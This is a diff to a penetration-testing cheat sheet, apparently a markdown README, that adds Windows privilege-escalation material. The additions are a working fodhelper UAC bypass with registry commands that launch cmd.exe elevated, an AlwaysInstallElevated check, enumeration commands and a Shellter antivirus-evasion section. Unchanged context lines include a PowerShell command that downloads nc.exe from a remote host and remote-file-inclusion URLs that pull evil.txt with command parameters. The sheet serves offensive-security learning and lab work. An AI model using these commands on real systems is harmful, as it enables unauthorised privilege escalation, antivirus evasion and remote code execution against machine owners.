@@ -38,10 +38,17 @@
 36. [Buffer Overflow](#Buffer-Overflow)
 36. [Vulnerability Scanning](#Vulnerability-Scanning)
 37. [Web Application Attacks](#Web-Application-Attacks)
+38. [AV Evasion](#AV-Evasion)
 
 <sub><sup>:warning: For educational purposes only! Do not run any of the commantds on a network or hardware that you do not own!</sup></sub>
 
 # Misc
+## Metasploit 
+### multi handler
+In case you got a Reverse Shell but the session immediately dies, try to migrate to another process with:
+```
+set AutoRunScript post/windows/manage/migrate
+```
 
 ## Cross-Compiling Exploit Code
 ```
@@ -53,6 +60,7 @@ i686-w64-mingw32-gcc 42341.c -o exploit.exe # In case of errors try -lws2_32 fla
 ```
 wine PE.exe
 ```
+
 
 ## Render webpages from command line
 * cutycapt: http://cutycapt.sourceforge.net/
@@ -1019,7 +1027,15 @@ aircrack-ng Path/to/my/captureFile/with/handshake.cap -w /Path/to/my/password/li
 
 # Windows Privilege Escalation
 
+## Switch to high integrity level
+```
+powershell.exe Start-Process cmd.exe -Verb runAs
+```
+
 ## [Checklist](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)
+
+## Process Monitoring
+* [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)
 
 ## System Enumeration
 ```
@@ -1027,7 +1043,10 @@ systeminfo
 hostname
 tasklist
 wmic qfe
+wmic qfe get Caption, Description, HotFixID, InstalledOn
 wmic logicaldisk get caption,description,providername
+mountvol
+Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"} #get kernel modules and device drivers
 ```
 
 ## User Enumeration
@@ -1039,6 +1058,17 @@ net user
 net user Administrator
 net localgroup
 net localgroup Administrators
+```
+
+## Scheduled Tasks
+```
+schtasks /query /fo LIST /v
+```
+
+## Applications
+Only shows application installed by windows installer
+```
+wmic product get name,version,vendor
 ```
 
 ## Network Enumeration
@@ -1054,16 +1084,54 @@ netstat -ano
 ```
 findstr /si password *.txt *.ini *.config
 ```
-## 
 
 ## AV and FW Enumeration
 ```
 sc query windefend
 sc queryex type= service # Show all services
 netsh advfirewall firewall dump
+netsh advfirewall show currentprofile
+netsh advfirewall firewall show rule name=all
 firewall show state
 netsh firewall show config
 ```
+
+## AutoElevate Binaries (SUID like)
+First, on Windows systems, we should check the status of the AlwaysInstallElevated48 registry setting. If this key is enabled (set to 1) in either HKEY_CURRENT_USER or HKEY_LOCAL_MACHINE, any user can run Windows Installer packages with elevated privileges.
+
+```
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+```
+
+## UAC Bypass
+The following example uses C:\windows\system32\fodhelper.exe which is launched every time a user opens 'Manage optional features'
+1. Use [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/) and sigcheck.exe to verify integrity level
+```
+sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
+```
+2. Look for 'requestedExecutionLevel'(requireAdministrator) and 'autoElevate'(true)
+3. Launch [Procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)
+4. Filter by process name
+5. Filter by Operation contains Reg
+6. Filter for Result = "NAME NOT FOUND" to get registry hives that are accessed but not exist
+7. Look for a registry hive that you have read and write access, e.g. HKEY_CURRENT_USER => Path contains HKCU
+8. Find out what the application attempts to query
+9. Look for other access to entries that contain same query (or part of it), if the process can successfully acces that key in some other hive, the results will provide us with more clues
+10. Create according registry, e.g. ``REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command``
+11. Find out what value fodhelper.exe attempts to query (DelegateExecute)
+12. Add a DelegateExecute entry, leaving its value empty. If the application discovers this empty value it will hopefully follow the MSDN specification for application protocols and look for a program to launch
+```
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
+```
+13. Replace "NAME NOT FOUND" filter with "SUCCESS"
+14. Verify fodhelper.exe finds the new DelegateExecute entry
+15. Replace the empty value with an executable (cmd.exe)
+```
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
+```
+
+
 
 ## Automated Enumeration Tools
 ### Download and run executable with simple bypass method (from cmd.exe)
@@ -1076,6 +1144,7 @@ IEX(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.23:8000/nc.ex
 ```
 
 ### Executables
+* [windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
 * [winPEAS.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 * [Seatbelt.exe](https://github.com/GhostPack/Seatbelt)
 * [Wason.exe](https://github.com/rasta-mouse/Watson)
@@ -1121,6 +1190,9 @@ pip install xlrd==1.2.0
 ```
 sudo -u#-1 /bin/bash
 ```
+
+## Unix Privesc Check
+* [unix-privesc-check](https://pentestmonkey.net/tools/audit/unix-privesc-check)
 
 ## LinEnum
 Download [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) and run it on victim's machine. 
@@ -2223,4 +2295,12 @@ http://10.10.10.10/script.php?file=/var/log/apache2/access.log&cmd=whoami
 http://10.10.10.10/script.php?file=http://10.10.10.11/evil.txt&cmd=ipconfig
 ```
 
-
+# AV Evasion
+## Code Injection
+* Shellter is a dynamic shellcode injection tool and one of the most popular free tools capable of bypassing antivirus software.
+```
+sudo apt install shellter
+sudo apt install wine
+sudo apt install wine32
+shellter
+```
